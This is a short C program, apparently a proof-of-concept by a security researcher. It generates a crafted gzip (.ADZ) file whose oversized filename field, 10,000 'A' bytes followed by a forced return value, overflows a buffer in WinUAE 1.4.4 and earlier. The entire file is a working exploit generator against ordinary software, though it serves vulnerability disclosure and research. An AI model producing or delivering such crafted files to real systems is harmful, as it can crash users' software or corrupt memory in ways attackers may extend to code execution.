/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>



#define VER     "0.1"
#define BOFSZ   10000   // 1000 + 8192 + the rest
#define BUFFSZ  (BOFSZ + 32)
#define u8      unsigned char



int putsc(u8 *data, int chr, int len);
int putxx(u8 *data, unsigned num, int bits);
void std_err(void);



int main(int argc, char *argv[]) {
    FILE    *fd;
    u8      *fname,
            *buff,
            *p;

    setbuf(stdout, NULL);

    fputs("\n"
        "WinUAE <= 1.4.4 gunzip buffer-overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <output.ADZ>\n"
            "\n", argv[0]);
        exit(1);
    }

    fname = argv[1];

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    p = buff;
    p += putxx(p, 0x1f,     8);     // header[0]
    p += putxx(p, 0x8b,     8);     // header[1]
    p += putxx(p, 0x00,     8);     // header[2]
    p += putxx(p, 0x08,     8);     // flags
    p += putsc(p, 0x00,     6);     // rest of the header
    p += putsc(p, 'A',      BOFSZ); // filename buffer-overflow
    p += putxx(p, 0,        8);     // NULL byte delimiter
    p += putxx(p, -1,       32);    // force the return

    printf("- create file %s\n", fname);
    fd = fopen(fname, "wb");
    if(!fd) std_err();
    fwrite(buff, 1, p - buff, fd);
    fclose(fd);
    free(buff);
    printf("- done\n");
    return(0);
}



int putsc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int putxx(u8 *data, unsigned num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;

    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}


